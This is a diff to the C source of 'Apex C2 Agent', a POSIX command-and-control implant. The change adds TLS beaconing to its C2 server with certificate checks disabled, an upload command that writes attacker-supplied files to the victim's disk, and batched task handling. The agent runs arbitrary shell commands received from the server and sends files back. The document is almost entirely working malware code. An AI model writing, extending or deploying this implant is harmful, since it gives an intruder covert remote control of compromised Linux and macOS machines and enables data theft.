@@ -1,9 +1,9 @@
 /*
  * Apex C2 Agent - POSIX implant (Linux + macOS)
- * Uses raw TCP sockets for HTTP beaconing. No external dependencies.
+ * Supports TLS/HTTPS via OpenSSL when USE_HTTPS=1.
  *
- * Linux:  gcc -O2 -s -o agent_linux agent_posix.c -lpthread
- * macOS:  clang -O2 -o agent_macos agent_posix.c -lpthread
+ * Linux:  gcc -O2 -s -o agent_linux agent_posix.c -lpthread [-lssl -lcrypto]
+ * macOS:  clang -O2 -o agent_macos agent_posix.c -lpthread [-lssl -lcrypto]
  */
 
 #define _GNU_SOURCE
@@ -26,6 +26,37 @@
 #include <netdb.h>
 #include <arpa/inet.h>
 #include <ifaddrs.h>
+
+#if USE_HTTPS
+#include <openssl/ssl.h>
+#include <openssl/err.h>
+
+static SSL_CTX *g_ssl_ctx = NULL;
+
+static void tls_init(void) {
+    if (g_ssl_ctx) return;
+#if OPENSSL_VERSION_NUMBER < 0x10100000L
+    SSL_library_init();
+    SSL_load_error_strings();
+    OpenSSL_add_all_algorithms();
+    g_ssl_ctx = SSL_CTX_new(SSLv23_client_method());
+#else
+    g_ssl_ctx = SSL_CTX_new(TLS_client_method());
+#endif
+    if (g_ssl_ctx)
+        SSL_CTX_set_verify(g_ssl_ctx, SSL_VERIFY_NONE, NULL);
+}
+
+static ssize_t tls_send_wrapper(SSL *ssl, int sock, const void *buf, size_t len) {
+    if (ssl) return (ssize_t)SSL_write(ssl, buf, (int)len);
+    return send(sock, buf, len, 0);
+}
+
+static ssize_t tls_recv_wrapper(SSL *ssl, int sock, void *buf, size_t len) {
+    if (ssl) return (ssize_t)SSL_read(ssl, buf, (int)len);
+    return recv(sock, buf, len, 0);
+}
+#endif /* USE_HTTPS */
 
 #ifndef C2_HOST
 #define C2_HOST "127.0.0.1"
@@ -207,13 +238,12 @@ static int json_get_string(const char *json, const char *key, char *out, size_t 
     return 0;
 }
 
-/* ── HTTP POST over raw TCP socket ───────────────────────── */
+/* ── HTTP POST over TCP socket (with optional TLS) ──────── */
 
 static int http_post(const char *host, int port, int use_https, const char *path,
                      const char *body, size_t body_len, const char *agent_id,
                      char *resp, size_t resp_len)
 {
-    (void)use_https; /* TLS not yet implemented for POSIX agent */
     resp[0] = '\0';
 
     struct addrinfo hints, *res;
@@ -229,7 +259,6 @@ static int http_post(const char *host, int port, int use_https, const char *path
     int sock = socket(res->ai_family, res->ai_socktype, res->ai_protocol);
     if (sock < 0) { freeaddrinfo(res); return -1; }
 
-    /* Set socket timeout */
     struct timeval tv = { .tv_sec = 15, .tv_usec = 0 };
     setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
     setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv));
@@ -238,6 +267,26 @@ static int http_post(const char *host, int port, int use_https, const char *path
         close(sock); freeaddrinfo(res); return -1;
     }
     freeaddrinfo(res);
+
+#if USE_HTTPS
+    SSL *ssl = NULL;
+    if (use_https) {
+        tls_init();
+        if (!g_ssl_ctx) { close(sock); return -1; }
+        ssl = SSL_new(g_ssl_ctx);
+        SSL_set_fd(ssl, sock);
+        SSL_set_tlsext_host_name(ssl, host);
+        if (SSL_connect(ssl) <= 0) {
+            SSL_free(ssl); close(sock); return -1;
+        }
+    }
+#define IO_SEND(buf, len) tls_send_wrapper(ssl, sock, buf, len)
+#define IO_RECV(buf, len) tls_recv_wrapper(ssl, sock, buf, len)
+#else
+    (void)use_https;
+#define IO_SEND(buf, len) send(sock, buf, len, 0)
+#define IO_RECV(buf, len) recv(sock, buf, len, 0)
+#endif
 
     /* Build HTTP request */
     char req[BUF_SIZE];
@@ -264,20 +313,25 @@ static int http_post(const char *host, int port, int use_https, const char *path
             "\r\n",
             path, host, port, body_len);
 
-    /* Send header + body */
-    if (send(sock, req, (size_t)hdr_len, 0) < 0) { close(sock); return -1; }
-    if (body_len > 0 && send(sock, body, body_len, 0) < 0) { close(sock); return -1; }
+    if (IO_SEND(req, (size_t)hdr_len) < 0) goto io_fail;
+    if (body_len > 0 && IO_SEND(body, body_len) < 0) goto io_fail;
 
     /* Read response */
-    char raw[BUF_SIZE];
+    char raw[BUF_SIZE * 2];
     size_t total = 0;
     ssize_t n;
-    while ((n = recv(sock, raw + total, sizeof(raw) - total - 1, 0)) > 0) {
+    while ((n = IO_RECV(raw + total, sizeof(raw) - total - 1)) > 0) {
         total += (size_t)n;
         if (total >= sizeof(raw) - 1) break;
     }
     raw[total] = '\0';
+
+#if USE_HTTPS
+    if (ssl) { SSL_shutdown(ssl); SSL_free(ssl); }
+#endif
     close(sock);
+#undef IO_SEND
+#undef IO_RECV
 
     /* Parse HTTP status */
     int status = 0;
@@ -297,6 +351,13 @@ static int http_post(const char *host, int port, int use_https, const char *path
     }
 
     return (status >= 200 && status < 300) ? 0 : -1;
+
+io_fail:
+#if USE_HTTPS
+    if (ssl) { SSL_shutdown(ssl); SSL_free(ssl); }
+#endif
+    close(sock);
+    return -1;
 }
 
 /* ── Command Execution (POSIX) ───────────────────────────── */
@@ -416,6 +477,116 @@ static void handle_download(const char *path, char *out_b64) {
     free(buf);
 }
 
+/* Handle 'upload' - write file to target disk.
+   Decoded args format: "<remote_path>\n<base64_file_data>" */
+static void handle_upload(const char *args, char *out_b64) {
+    if (!args || !args[0]) {
+        b64_encode((unsigned char*)"Usage: upload <remote_path> (data in args)", 43, out_b64);
+        return;
+    }
+    const char *nl = strchr(args, '\n');
+    if (!nl) {
+        b64_encode((unsigned char*)"Invalid upload format: expected path\\ndata", 42, out_b64);
+        return;
+    }
+    char path[4096];
+    size_t plen = (size_t)(nl - args);
+    if (plen >= sizeof(path)) plen = sizeof(path) - 1;
+    memcpy(path, args, plen);
+    path[plen] = '\0';
+
+    const char *data_b64 = nl + 1;
+    size_t alloc_sz = strlen(data_b64) + 1;
+    if (alloc_sz < BUF_SIZE) alloc_sz = BUF_SIZE;
+    unsigned char *file_data = (unsigned char *)malloc(alloc_sz);
+    if (!file_data) {
+        b64_encode((unsigned char*)"Out of memory", 13, out_b64);
+        return;
+    }
+    int data_len = b64_decode(data_b64, file_data, alloc_sz);
+    if (data_len <= 0) {
+        free(file_data);
+        b64_encode((unsigned char*)"Invalid file data", 17, out_b64);
+        return;
+    }
+
+    FILE *f = fopen(path, "wb");
+    if (!f) {
+        char msg[256];
+        snprintf(msg, sizeof(msg), "Cannot create file: %s (%s)", path, strerror(errno));
+        b64_encode((unsigned char*)msg, strlen(msg), out_b64);
+        free(file_data);
+        return;
+    }
+    size_t written = fwrite(file_data, 1, (size_t)data_len, f);
+    fclose(f);
+    free(file_data);
+
+    char msg[256];
+    snprintf(msg, sizeof(msg), "Uploaded %zu bytes to %s", written, path);
+    b64_encode((unsigned char*)msg, strlen(msg), out_b64);
+}
+
+/* ── Multi-task JSON parser ─────────────────────────────── */
+
+#define MAX_TASKS_PER_BEACON 16
+
+typedef struct {
+    char id[128];
+    char command[256];
+    char arguments_b64[BUF_SIZE];
+} parsed_task;
+
+static int parse_tasks(const char *resp, parsed_task *tasks, int max_tasks) {
+    const char *arr = strstr(resp, "\"tasks\"");
+    if (!arr) return 0;
+    arr = strchr(arr, '[');
+    if (!arr) return 0;
+
+    int count = 0;
+    const char *cursor = arr + 1;
+    char obj[BUF_SIZE];
+
+    while (count < max_tasks) {
+        while (*cursor && *cursor != '{' && *cursor != ']') cursor++;
+        if (*cursor != '{') break;
+
+        const char *start = cursor;
+        int depth = 0;
+        do {
+            if (*cursor == '"') {
+                cursor++;
+                while (*cursor && *cursor != '"') {
+                    if (*cursor == '\\') cursor++;
+                    cursor++;
+                }
+                if (*cursor) cursor++;
+            } else {
+                if (*cursor == '{') depth++;
+                else if (*cursor == '}') depth--;
+                cursor++;
+            }
+        } while (*cursor && depth > 0);
+
+        size_t len = (size_t)(cursor - start);
+        if (len >= sizeof(obj)) len = sizeof(obj) - 1;
+        memcpy(obj, start, len);
+        obj[len] = '\0';
+
+        tasks[count].id[0] = '\0';
+        tasks[count].command[0] = '\0';
+        tasks[count].arguments_b64[0] = '\0';
+
+        json_get_string(obj, "\"id\"", tasks[count].id, sizeof(tasks[count].id));
+        json_get_string(obj, "\"command\"", tasks[count].command, sizeof(tasks[count].command));
+        json_get_string(obj, "\"arguments\"", tasks[count].arguments_b64, sizeof(tasks[count].arguments_b64));
+
+        if (tasks[count].id[0] && tasks[count].command[0])
+            count++;
+    }
+    return count;
+}
+
 /* ── Beacon Loop ─────────────────────────────────────────── */
 
 static void run_beacon(void) {
@@ -475,8 +646,7 @@ static void run_beacon(void) {
 
     srand((unsigned)(time(NULL) ^ getpid()));
 
-    char body[BUF_SIZE], resp[BUF_SIZE];
-    char task_id[128], task_cmd[256], task_args_b64[BUF_SIZE], args_decoded[BUF_SIZE];
+    char body[BUF_SIZE], resp[BUF_SIZE * 2];
 
     for (;;) {
         if (!g_agent_id[0]) {
@@ -503,52 +673,58 @@ static void run_beacon(void) {
             goto do_sleep;
         }
 
-        task_id[0] = task_cmd[0] = task_args_b64[0] = args_decoded[0] = '\0';
-        if (json_get_string(resp, "\"id\"", task_id, sizeof(task_id)) != 0)
-            goto do_sleep;
-        json_get_string(resp, "\"command\"", task_cmd, sizeof(task_cmd));
-        json_get_string(resp, "\"arguments\"", task_args_b64, sizeof(task_args_b64));
-        if (!task_cmd[0]) goto do_sleep;
+        /* Parse all pending tasks from response */
+        parsed_task tasks[MAX_TASKS_PER_BEACON];
+        int task_count = parse_tasks(resp, tasks, MAX_TASKS_PER_BEACON);
+        if (task_count == 0) goto do_sleep;
 
-        if (task_args_b64[0]) {
-            int alen = b64_decode(task_args_b64, (unsigned char*)args_decoded, sizeof(args_decoded)-1);
-            if (alen > 0) args_decoded[alen] = '\0'; else args_decoded[0] = '\0';
-        }
+        /* Allocate results buffer for all tasks */
+        size_t results_cap = (size_t)(task_count + 1) * (BUF_SIZE + 256) + 256;
+        char *results = (char *)malloc(results_cap);
+        if (!results) goto do_sleep;
+        size_t roff = 0;
+        roff += (size_t)snprintf(results + roff, results_cap - roff, "{\"results\":[");
+        int should_exit = 0;
 
-        /* Execute task */
-        {
+        for (int t = 0; t < task_count; t++) {
+            char args_decoded[BUF_SIZE];
+            args_decoded[0] = '\0';
+            if (tasks[t].arguments_b64[0]) {
+                int alen = b64_decode(tasks[t].arguments_b64,
+                                      (unsigned char*)args_decoded, sizeof(args_decoded)-1);
+                if (alen > 0) args_decoded[alen] = '\0'; else args_decoded[0] = '\0';
+            }
+
             char out_b64[BUF_SIZE];
             out_b64[0] = '\0';
             int success = 1;
 
-            if (strcmp(task_cmd, "sleep") == 0) {
+            if (strcmp(tasks[t].command, "sleep") == 0) {
                 handle_sleep_cmd(args_decoded, out_b64);
-            } else if (strcmp(task_cmd, "whoami") == 0) {
+            } else if (strcmp(tasks[t].command, "whoami") == 0) {
                 handle_whoami(out_b64);
-            } else if (strcmp(task_cmd, "ps") == 0) {
+            } else if (strcmp(tasks[t].command, "ps") == 0) {
                 handle_ps(out_b64);
-            } else if (strcmp(task_cmd, "pwd") == 0) {
+            } else if (strcmp(tasks[t].command, "pwd") == 0) {
                 handle_pwd(out_b64);
-            } else if (strcmp(task_cmd, "cd") == 0) {
+            } else if (strcmp(tasks[t].command, "cd") == 0) {
                 handle_cd(args_decoded[0] ? args_decoded : ".", out_b64);
-            } else if (strcmp(task_cmd, "getuid") == 0 || strcmp(task_cmd, "id") == 0) {
+            } else if (strcmp(tasks[t].command, "getuid") == 0 || strcmp(tasks[t].command, "id") == 0) {
                 handle_getuid(out_b64);
-            } else if (strcmp(task_cmd, "download") == 0) {
+            } else if (strcmp(tasks[t].command, "download") == 0) {
                 handle_download(args_decoded, out_b64);
-            } else if (strcmp(task_cmd, "exit") == 0) {
+            } else if (strcmp(tasks[t].command, "upload") == 0) {
+                handle_upload(args_decoded, out_b64);
+            } else if (strcmp(tasks[t].command, "exit") == 0) {
                 b64_encode((unsigned char*)"Agent exiting", 13, out_b64);
-                snprintf(body, sizeof(body), "{\"results\":[{\"task_id\":\"%s\",\"output\":\"%s\",\"success\":true}]}",
-                         task_id, out_b64);
-                http_post(host, port, use_https, path, body, strlen(body), g_agent_id, resp, sizeof(resp));
-                _exit(0);
+                should_exit = 1;
             } else {
-                /* Shell command via /bin/sh */
                 char cmdline[4096] = "";
-                if (strcmp(task_cmd, "exec") == 0 || strcmp(task_cmd, "shell") == 0) {
+                if (strcmp(tasks[t].command, "exec") == 0 || strcmp(tasks[t].command, "shell") == 0) {
                     if (args_decoded[0]) strncpy(cmdline, args_decoded, sizeof(cmdline)-1);
                 } else {
                     snprintf(cmdline, sizeof(cmdline), "%s%s%s",
-                             task_cmd, args_decoded[0] ? " " : "", args_decoded);
+                             tasks[t].command, args_decoded[0] ? " " : "", args_decoded);
                 }
                 if (cmdline[0]) {
                     success = (exec_cmd(cmdline, out_b64, sizeof(out_b64)) == 0);
@@ -558,10 +734,17 @@ static void run_beacon(void) {
                 }
             }
 
-            snprintf(body, sizeof(body), "{\"results\":[{\"task_id\":\"%s\",\"output\":\"%s\",\"success\":%s}]}",
-                     task_id, out_b64, success ? "true" : "false");
-            http_post(host, port, use_https, path, body, strlen(body), g_agent_id, resp, sizeof(resp));
+            if (t > 0) roff += (size_t)snprintf(results + roff, results_cap - roff, ",");
+            roff += (size_t)snprintf(results + roff, results_cap - roff,
+                "{\"task_id\":\"%s\",\"output\":\"%s\",\"success\":%s}",
+                tasks[t].id, out_b64, success ? "true" : "false");
         }
+
+        roff += (size_t)snprintf(results + roff, results_cap - roff, "]}");
+        http_post(host, port, use_https, path, results, roff, g_agent_id, resp, sizeof(resp));
+        free(results);
+
+        if (should_exit) _exit(0);
 
 do_sleep:
         {
